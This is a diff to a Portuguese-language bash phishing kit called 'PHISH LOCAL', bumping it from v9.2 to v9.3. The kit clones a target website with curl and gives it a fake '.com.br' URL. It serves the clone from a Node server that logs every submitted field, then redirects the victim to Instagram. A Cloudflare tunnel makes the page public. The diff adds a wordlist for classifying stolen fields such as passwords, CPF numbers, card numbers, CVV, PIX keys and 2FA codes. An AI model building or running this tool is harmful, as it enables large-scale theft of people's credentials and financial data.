@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISH LOCAL v9.2 - Universal Wordlist
+# 🎣 PHISH LOCAL v9.3 - Universal Wordlist
 # Captura QUALQUER campo de QUALQUER site
 # Cloudflare Tunnel | Sem root | Sem login
 # ============================================
@@ -13,7 +13,7 @@ SERVER_FILE="server/server.js"
 clear
 echo ""
 echo "=========================================="
-echo "  🎣 PHISH LOCAL v9.2"
+echo "  🎣 PHISH LOCAL v9.3"
 echo "=========================================="
 echo ""
 echo "  1) Criar phishing"
@@ -47,8 +47,7 @@ case "$CHOICE" in
     read NAME
     NAME=$(echo "$NAME" | tr -d '\r' | xargs | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
     [ -z "$NAME" ] && NAME="login"
-    URL_NAME="${NAME}.com.br"
-    echo "[!] URL falsa: https://${URL_NAME}"
+    echo "[!] URL falsa: https://${NAME}.com.br"
 
     # --- CLONAR SITE ---
     echo ""
@@ -61,7 +60,7 @@ case "$CHOICE" in
     curl -s -L -H "User-Agent: $USER_AGENT" -o "$SITE_DIR/index.html" "$URL" 2>/dev/null
 
     if [ ! -s "$SITE_DIR/index.html" ]; then
-        echo "[!] Nao foi possivel clonar. Usando pagina de login padrao."
+        echo "[!] Nao foi possivel clonar. Usando pagina padrao."
         cat > "$SITE_DIR/index.html" << 'EOF'
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -119,7 +118,8 @@ const PORT=process.env.PORT||8080;
 const SITE_DIR=process.env.SITE_DIR||'site_clone';
 const LOG_FILE=process.env.LOG_FILE||'capturas.txt';
 const REDIRECT=process.env.REDIRECT||'https://instagram.com';
-const WORDLIST=PLACEHOLDER_WORDLIST;
+
+const WORDLIST=['login','signin','sign_in','log_in','entrar','acessar','iniciar','cadastrar','registrar','username','user','email','e-mail','telefone','phone','cpf','cnpj','matricula','identifier','userid','password','senha','pass','passwd','pwd','palavra','chave','secret','pin','codigo','nome','name','fullname','firstname','lastname','sobrenome','social_name','razao_social','mae','pai','data','date','nascimento','birth','birthdate','ano','mes','dia','endereco','rua','avenida','address','street','cep','zip','zipcode','bairro','cidade','pais','country','complemento','empresa','company','trabalho','profissao','escola','universidade','curso','departamento','cargo','cartao','card','credit_card','cvv','validade','conta','banco','agencia','pix','token','otp','verification','captcha','2fa','auth','pergunta','resposta','termos','terms','privacidade','privacy','aceitar','remember','newsletter'];
 
 function classifyField(name){
     name=(name||'').toLowerCase().replace(/[^a-z0-9_]/g,'');
@@ -250,7 +250,6 @@ SERVEREOF
         cloudflared tunnel --url "http://localhost:$PORT" > /tmp/cf_tunnel.log 2>&1 &
         CF_PID=$!
 
-        # Esperar ate 15 segundos pela URL
         for i in $(seq 1 15); do
             sleep 1
             CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
@@ -294,7 +293,6 @@ SERVEREOF
     node "$SERVER_FILE" &
     SERVER_PID=$!
 
-    # Se tiver cloudflare, mostrar URL de novo apos 2s
     if [ -n "$CF_URL" ]; then
         sleep 2
         echo ""
